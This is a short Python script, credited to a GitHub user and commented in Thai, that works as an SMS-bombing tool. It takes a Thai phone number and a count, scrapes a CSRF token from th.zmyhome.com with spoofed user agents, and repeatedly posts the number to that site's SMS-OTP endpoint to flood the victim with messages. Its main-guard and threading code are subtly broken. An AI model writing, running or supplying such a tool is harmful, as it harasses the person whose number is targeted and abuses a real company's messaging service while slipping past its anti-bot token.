import requests as ru
import threading, time, os, random, datetime
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent


#decorate โครงสร้าง
os.system('clear')
print("  ___ ___  _   __  __ __  __ ___ ___  ")
print(" / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
print(" \__ \  _/ _ \| |\/| | |\/| | _||   / ")
print(" |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
print("                                      ")
print(" Spammer: github.com/MONIFIRE          ")
print("                                      ")
#input ใสเบอร์โทรศัพท์
num = input(' Enter mobile number : ')
spam = input(' Enter the number of sms : ')
print ('')
if int(num) <= 99999999 or int(num) >= 999999999:
         print(' Enter a Thailand phone number [ ! ]')
         os.system('python ZMyHomeOTP.py')
else:
     #requests ขอ sms
     def A(phone):
         SEND  = ru.Session()
         time = datetime.datetime.now()
         API_WEB = SEND.get('https://th.zmyhome.com/',headers={"user-agent": generate_user_agent()}).text
         SEND_TOKEN = bs(API_WEB,'html.parser')
         TOKEN = SEND_TOKEN.find("input",attrs={"name":"_csrf"})
         SMS = SEND.post('https://th.zmyhome.com/api/ajax/sms-otp',headers={"x-csrf-token": TOKEN['value'],"content-type": "application/x-www-form-urlencoded; charset=UTF-8"},data='tel='+phone+'&userId=').text
         print(time.strftime(" NOW TIME - [ %H:%M:%S ] : "+SMS))

#SEND สเเปม
if _name_ == "_main_":
    for send in range(int(spam)):
        time.sleep(1)
        thread = threading.Thread(target=A(f'{num}'))
        thread.start()
